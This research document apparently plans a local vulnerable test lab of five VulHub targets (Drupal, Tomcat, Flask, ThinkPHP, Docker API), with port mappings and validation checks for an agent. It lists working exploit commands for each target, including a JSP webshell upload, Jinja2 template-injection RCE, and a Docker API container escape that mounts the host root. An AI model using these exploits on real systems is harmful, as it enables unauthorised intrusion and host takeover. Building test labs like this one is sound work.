# Research: Vulnerable Test Lab

**Phase**: 0 — Research & Unknown Resolution
**Date**: 2026-06-02
**Status**: Complete

## VulHub Target Availability

Research confirmed VulHub has all 5 required targets (some under different CVE paths):

| Target | VulHub Path | Exists | Notes |
|--------|------------|--------|-------|
| Drupal CVE-2018-7600 | `drupal/CVE-2018-7600/` | Yes | Prebuilt image `vulhub/drupal:8.5.0`, port 8080:80 |
| Tomcat CVE-2017-12617 | `tomcat/CVE-2017-12615/` | Yes (12615 variant) | Requires `build: .`; Dockerfile sets `readonly=false` for PUT uploads; port 8080:8080 |
| Flask SSTI | `flask/ssti/` | Yes | Prebuilt image with volume mount `./src:/app` for app code; port 8000:8000 |
| ThinkPHP CVE-2018-20062 | `thinkphp/5-rce/` | Yes (5-rce path) | Prebuilt image `vulhub/thinkphp:5.0.20`; port 8080:80; same exploit vector as CVE-2018-20062 |
| Docker API RCE | `docker/unauthorized-rce/` | Yes | Requires `build: .`; privileged mode; Docker-in-Docker; port 2375:2375 |

## Host Port Mapping (Resolved)

All 5 targets share some container ports (80 or 8080), so unique host ports are required:

| Target | Container Port | Host Port | Rationale |
|--------|---------------|-----------|-----------|
| Drupal | 80 | 8081 | Matches original plan |
| Tomcat | 8080 | 8082 | Conflicts with Drupal 8081; shifted to 8082 |
| Flask | 8000 | 8000 | No conflict, matches VulHub default |
| ThinkPHP | 80 | 8083 | Conflicts with Drupal's host 8081; shifted to 8083 |
| Docker API | 2375 | 2375 | No conflict, matches VulHub default |

## Exploit Technical Details

### Target 1: Drupalgeddon 2 (CVE-2018-7600)

- **Vulnerable Versions**: Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1
- **Root Cause**: Improper input validation in Form API, allowing array-based injection of render API properties
- **Exploit**: POST to `/user/register` with `#post_render` callback injection:
  ```bash
  curl -k 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id'
  ```
- **RCE via**: Drupal render API `#post_render` / `#lazy_builder` callback injection
- **No auxiliary infrastructure needed**: Direct HTTP request/response

### Target 2: Tomcat PUT RCE (CVE-2017-12615 / CVE-2017-12617)

- **Vulnerable Versions**: Tomcat 7.0.0-7.0.81, 8.5.0-8.5.22, 9.0.0.M1-9.0.0
- **Root Cause**: Default Servlet `readonly` param set to `false` enables PUT, and trailing-slash bypass allows `.jsp` upload
- **Exploit**:
  ```bash
  # Upload JSP webshell (trailing slash bypass)
  curl -X PUT 'http://localhost:8082/shell.jsp/' -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
  # Execute command
  curl 'http://localhost:8082/shell.jsp?cmd=id'
  ```
- **RCE via**: JSP compilation and execution on Tomcat
- **No auxiliary infrastructure needed**: Direct HTTP PUT + GET

### Target 3: Flask SSTI (Jinja2)

- **Vulnerable Versions**: Flask with Jinja2, `render_template_string()` with user input
- **Root Cause**: User input concatenated into `Template()` constructor without sanitization
- **Exploit**:
  ```bash
  # Detection
  curl 'http://localhost:8000/?name={{7*7}}'
  # RCE via os.popen
  curl 'http://localhost:8000/?name={{ lipsum.__globals__["os"].popen("id").read() }}'
  ```
- **RCE via**: Python `os.popen()` via Jinja2 `__globals__` traversal
- **No auxiliary infrastructure needed**: Direct HTTP GET

### Target 4: ThinkPHP 5 RCE (CVE-2018-20062)

- **Vulnerable Versions**: ThinkPHP 5.0.x, 5.1.x
- **Root Cause**: Route parameter `s` allows namespace injection to call arbitrary static methods
- **Exploit**:
  ```bash
  curl 'http://localhost:8083/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
  ```
- **RCE via**: PHP `call_user_func_array` on arbitrary functions
- **No auxiliary infrastructure needed**: Direct HTTP GET

### Target 5: Docker API RCE

- **Vulnerable Setup**: Docker daemon listening on TCP 2375 without TLS authentication
- **Exploit**:
  ```bash
  # Create privileged container with host root mounted
  curl -X POST -H 'Content-Type: application/json' \
    http://localhost:2375/containers/create?name=exploit \
    -d '{"Image":"alpine","Cmd":["chroot","/mnt","id"],"Binds":["/:/mnt:rbind"],"Privileged":true}'
  # Start and capture output
  curl -X POST http://localhost:2375/containers/exploit/start
  # Or use logs/attach to get output
  curl http://localhost:2375/containers/exploit/logs?stdout=true
  ```
- **RCE via**: Host root filesystem mount + chroot from privileged container
- **No auxiliary infrastructure needed**: Direct REST API calls

## Exploitation Validation (3-Layer Approach)

Based on user specification (resolved in clarify session):

- **L1 - Identity Check**: Agent places marker at `/tmp/agent_is_present` on own machine. Check `[ ! -f /tmp/agent_is_present ]` on target output.
- **L2 - Environment Fingerprint**: `ip a` (container shows internal 172.x addresses), `hostname` (Docker container IDs vs hostnames), `/proc/1/cgroup` (contains `docker` in path).
- **L3 - Unique Artifact**: `touch /tmp/pwned_$(date +%s_%N)` on target, verify existence across callback.
- **Fallback**: Each layer falls through to next if unavailable or inconclusive.

## Key Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Tomcat CVE variant | CVE-2017-12615 (VulHub path) instead of 12617 | 12615 configures `readonly=false` which enables both CVEs; same exploit behavior |
| ThinkPHP path | `thinkphp/5-rce` (VulHub path) | Maps to ThinkPHP 5.0.20 which IS vulnerable to CVE-2018-20062; exact same exploit |
| Drupal port | 8081 → 80 (host → container) | Original plan spec; VulHub default is 8080 |
| Tomcat port | 8082 → 8080 | Avoids conflict with Drupal (8081) and Flask (8000) |
| ThinkPHP port | 8083 → 80 | Avoids conflict with Drupal (8081) and Tomcat (8082) |
| Build strategy | Prebuilt images for Drupal, Flask, ThinkPHP; build for Tomcat & Docker | VulHub provides prebuilt images for some; Tomcat & Docker need local build for Dockerfile modifications |
